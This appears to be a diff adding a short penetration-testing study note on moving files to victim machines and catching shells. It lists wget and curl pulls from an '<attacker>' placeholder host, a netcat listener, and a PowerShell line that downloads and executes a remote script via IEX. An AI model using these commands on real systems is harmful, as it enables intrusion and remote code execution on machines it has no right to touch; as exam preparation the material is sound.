@@ -1,0 +1,12 @@
+📁 File Transfer & Shells (5%)
+
+📘 Focus:
+- Transferring files to/from victim machines
+
+🛠️ Tools/Commands:
+- python3 -m http.server 80
+- wget http://<attacker>/file
+- curl -O http://<attacker>/file
+- nc -nlvp <port> (listener)
+- PowerShell (Windows):
+  IEX(New-Object Net.WebClient).DownloadString('http://attacker/script')
